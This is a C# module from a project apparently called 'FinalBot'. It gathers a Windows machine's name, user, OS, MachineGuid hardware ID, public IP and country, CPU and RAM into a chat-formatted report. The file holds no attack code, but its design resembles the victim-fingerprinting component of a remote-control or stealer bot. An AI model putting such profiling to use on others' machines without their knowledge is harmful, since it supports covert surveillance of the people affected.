using System;
using System.IO;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Net.Http;
using Newtonsoft.Json.Linq;
using System.Linq;

namespace FinalBot.Modules
{
    public static class SystemInfoModule
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private class MEMORYSTATUSEX
        {
            public uint dwLength;
            public uint dwMemoryLoad;
            public ulong ullTotalPhys;
            public ulong ullAvailPhys;
            public ulong ullTotalPageFile;
            public ulong ullAvailPageFile;
            public ulong ullTotalVirtual;
            public ulong ullAvailVirtual;
            public ulong ullAvailExtendedVirtual;
            public MEMORYSTATUSEX()
            {
                this.dwLength = (uint)Marshal.SizeOf<MEMORYSTATUSEX>();
            }
        }

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool GlobalMemoryStatusEx([In, Out] MEMORYSTATUSEX lpBuffer);

        public static string GetSystemInfo()
        {
            var sb = new StringBuilder();
            sb.AppendLine("📋 *SYSTEM INFORMATION*");
            sb.AppendLine($"🏁 *PC:* {Environment.MachineName}");
            sb.AppendLine($"👤 *User:* {Environment.UserName}");
            sb.AppendLine($"🌐 *OS:* {GetFriendlyOSName()}");
            sb.AppendLine($"🆔 *HWID:* {GetHWID()}");
            var (ip, country, flag) = GetCountryInfo();
            sb.AppendLine($"📡 *IP:* {ip} {flag} {country}");
            sb.AppendLine($"🔋 *CPU:* {GetCPUName()}");
            sb.AppendLine($"🧠 *RAM:* {GetTotalRAM()} GB");

            return sb.ToString();
        }

        public static (string ip, string country, string flag) GetCountryInfo()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    var response = client.GetStringAsync("http://ip-api.com/json/").Result;
                    var json = JObject.Parse(response);
                    string ip = json["query"]?.ToString() ?? "Unknown";
                    string country = json["country"]?.ToString() ?? "Unknown";
                    string countryCode = json["countryCode"]?.ToString()?.ToLower() ?? "";
                    
                    string flag = !string.IsNullOrEmpty(countryCode) ? GetFlagEmoji(countryCode) : "🏳️";
                    return (ip, country, flag);
                }
            }
            catch { return ("Unknown", "Unknown", "🏳️"); }
        }

        private static string GetFlagEmoji(string countryCode)
        {
            if (countryCode.Length != 2) return "🏳️";
            int firstChar = countryCode[0] - 'a' + 0x1F1E6;
            int secondChar = countryCode[1] - 'a' + 0x1F1E6;
            return char.ConvertFromUtf32(firstChar) + char.ConvertFromUtf32(secondChar);
        }

        public static string GetFriendlyOSName()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                {
                    if (key != null)
                    {
                        var productName = key.GetValue("ProductName");
                        var displayVersion = key.GetValue("DisplayVersion") ?? key.GetValue("ReleaseId");
                        if (productName != null)
                        {
                            string os = productName.ToString();
                            // Fix Windows 10 reporting as 11 in some registry keys
                            if (os.Contains("Windows 10") && Environment.OSVersion.Version.Build >= 22000)
                                os = os.Replace("Windows 10", "Windows 11");
                            
                            return displayVersion != null ? $"{os} ({displayVersion})" : os;
                        }
                    }
                }
            }
            catch { }
            return Environment.OSVersion.ToString();
        }

        public static string GetHWID()
        {
            try 
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
                {
                    if (key != null)
                    {
                        var val = key.GetValue("MachineGuid");
                        if (val != null) return val.ToString();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        public static string GetExternalIP()
        {
            try 
            {
                using (var client = new System.Net.Http.HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    var task = client.GetStringAsync("https://api.ipify.org");
                    if (task.Wait(5000)) return task.Result;
                    return "Timeout";
                }
            }
            catch { return "Unknown"; }
        }

        private static string GetCPUName()
        {
            try 
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0"))
                {
                    if (key != null)
                    {
                        var val = key.GetValue("ProcessorNameString");
                        if (val != null) return val.ToString().Trim();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private static string GetTotalRAM()
        {
            try 
            {
                MEMORYSTATUSEX memStatus = new MEMORYSTATUSEX();
                if (GlobalMemoryStatusEx(memStatus))
                {
                    return (memStatus.ullTotalPhys / 1024 / 1024 / 1024).ToString();
                }
            }
            catch { }
            return "Unknown";
        }
    }
}
